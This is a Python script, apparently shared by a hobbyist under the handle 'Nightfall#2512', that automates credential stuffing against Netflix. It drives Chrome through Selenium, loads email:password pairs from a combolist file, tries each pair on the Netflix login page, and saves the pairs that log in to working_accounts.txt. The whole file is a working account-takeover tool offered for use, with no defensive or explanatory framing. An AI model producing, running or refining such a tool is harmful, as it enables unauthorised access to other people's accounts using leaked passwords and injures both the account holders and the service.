from colorama import Fore, Style, init
import os 
import time
 
import selenium
from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.keys import Keys
init(convert=True)
 
print(f'''{Fore.RED}
Loading.. Netflix Checker  ~coded by Nightfall#2512~
''')
 
options = webdriver.ChromeOptions()
options.add_experimental_option("excludeSwitches", ["enable-logging"])
driver = webdriver.Chrome(options=options, executable_path=r"chromedriver.exe")
os.system('cls')
 
print(f'''{Fore.RED}
             _   _ _  __             _               _              
            | | | (_)/ _|           | |             | |            
  _ __   ___| |_| |_| |___  __   ___| |__   ___  ___| | _____ _ __ 
 | '_ \ / _ \ __| | |  _\ \/ /  / __| '_ \ / _ \/ __| |/ / _ \ '__|
 | | | |  __/ |_| | | |  >  <  | (__| | | |  __/ (__|   <  __/ |   
 |_| |_|\___|\__|_|_|_| /_/\_\  \___|_| |_|\___|\___|_|\_\___|_|   
                                                                   
                                                                  
''')
 
 
combination = []
email_list = []
password_list = []
working = []
txtFile = input(f"{Style.RESET_ALL}Name of txt file (Must be in the same directory. example format: filename.txt): {Fore.RED}")
print(f"Starting process.\n\n{Style.RESET_ALL}")
 
with open(txtFile,"r") as combolist:
    for line in combolist:
        splitLine = line.split(":")
        combination.append(line.strip())
        email_list.append(splitLine[0])
        password_list.append(splitLine[1].strip())
 
 
def checker(email,password):
    #make sure ur in the login page
    try:
        site = "https://netflix.com/Login"
        driver.get(site) #Load the website
        time.sleep(7)
        print('[*] validating email lol')
        driver.find_element_by_xpath('//*[@id="id_userLoginId"]').send_keys(email)
        time.sleep(1)
        print('[*] checking passsword')
        driver.find_element_by_xpath('//*[@id="id_password"]').send_keys(password)
        time.sleep(2)
        print('[*] checking email and password')
        driver.find_element_by_xpath('//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/button').click()
        print('[*] finished')
    except:
        print(f'{Style.RESET_ALL}[*]error wtf ')
 
def isLoggedIn():
    try:
        driver.find_element_by_xpath('//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/button').click()
        print('[!!] No account found!\n\n')
    except:
        print("You ARE ALREADY LOGGED IN !")
        return True
    return False
def bruteforce(email_list,password_list):
    global working
    global driver
    for email,password in zip(email_list,password_list):
        print(f"[!!] Checking email: {email}")
        print(f"[!!] Checking password: {password}")
        checker(email,password)
        time.sleep(3)
        if isLoggedIn():
            print(f"\n{Style.RESET_ALL}   ____________________________________________\n")
            print(f"[!!] {Fore.GREEN}ACCOUNT FOUND:{Style.RESET_ALL} {email}")
            print(f"   ____________________________________________\n")
            working.append(email  + ':' + password)
            with open("working_accounts.txt","w") as txtFile:
                print('[*] Appending to working_accounts.txt\n')
                for wo in working:
                    txtFile.write(wo)
                    txtFile.write("\n")
            driver.quit()
            driver = webdriver.Chrome(options=options, executable_path=r"chromedriver.exe")
    return working
 
if __name__ == '__main__':
    bruteforce(email_list,password_list)